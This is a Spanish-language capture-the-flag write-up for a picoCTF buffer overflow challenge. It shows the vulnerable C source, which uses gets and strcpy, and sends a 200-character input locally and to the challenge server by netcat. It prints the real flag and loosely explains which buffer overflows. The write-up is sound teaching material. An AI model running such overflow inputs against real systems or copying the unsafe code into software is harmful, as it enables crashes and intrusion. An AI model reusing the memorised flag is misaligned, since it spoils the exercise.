## Descripción
Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/521/vuln). You can view source [here](https://artifacts.picoctf.net/c/521/vuln.c). And connect with it using:`nc saturn.picoctf.net 65355`

## Solución
1. Descargamos el código fuente y el archivo binario.
``` shell
┌──(kali㉿kali)-[~/pico]
└─$ wget https://artifacts.picoctf.net/c/521/vuln https://artifacts.picoctf.net/c/521/vuln.c
--2022-11-29 00:02:24--  https://artifacts.picoctf.net/c/521/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.249.74.69, 13.249.74.22, 13.249.74.17, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.249.74.69|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16016 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                                      100%[===================================================================================>]  15.64K  --.-KB/s    in 0.01s   

2022-11-29 00:02:25 (1.21 MB/s) - ‘vuln’ saved [16016/16016]

--2022-11-29 00:02:25--  https://artifacts.picoctf.net/c/521/vuln.c
Reusing existing connection to artifacts.picoctf.net:443.
HTTP request sent, awaiting response... 200 OK
Length: 808 [application/octet-stream]
Saving to: ‘vuln.c’

vuln.c                                    100%[===================================================================================>]     808  --.-KB/s    in 0s      

2022-11-29 00:02:26 (1.73 MB/s) - ‘vuln.c’ saved [808/808]

FINISHED --2022-11-29 00:02:26--
Total wall clock time: 1.8s
Downloaded: 2 files, 16K in 0.01s (1.23 MB/s)

┌──(kali㉿kali)-[~/pico]
└─$ ls
vuln  vuln.c

```
2. Damos permisos de ejecución al binario que descargamos.
``` shell
┌──(kali㉿kali)-[~/pico]
└─$ chmod +x vuln         
```
3. Creamos un archivo con el nombre de flag.txt
``` shell
┌──(kali㉿kali)-[~/pico]
└─$ echo 'flag{dummieflag}' > flag.txt
```
4. Inpeccionamos el código fuente del programa.
``` shell
┌──(kali㉿kali)-[~/pico]
└─$ cat vuln.c  
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
           
```
Vemos que el código maneja un buffer de 100 caracteres por lo que si pasamos una cadena de input mayor a 100 caracteres lograremos obtener la bandera.

4. Ejecutamos el archivo binario de forma local para ver si obtenemos la bandera.
``` shell
┌──(kali㉿kali)-[~/pico]
└─$ ./vuln
Input: $(python3 -c "print('A'*200)")
flag{dummieflag}

```
y como podemos ver obtuvimos la bandera local por lo que solo queda obtener la bandera conenctanodos por netcat.

5. Debordamos el buffer pasando una cadena de inpput con más de 100 caracteres para desbordar el buffer
``` shell
┌──(kali㉿kali)-[~/pico]
└─$ nc saturn.picoctf.net 65355 <<< $(python3 -c "print('A'*200)") 
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}
```

## Notas

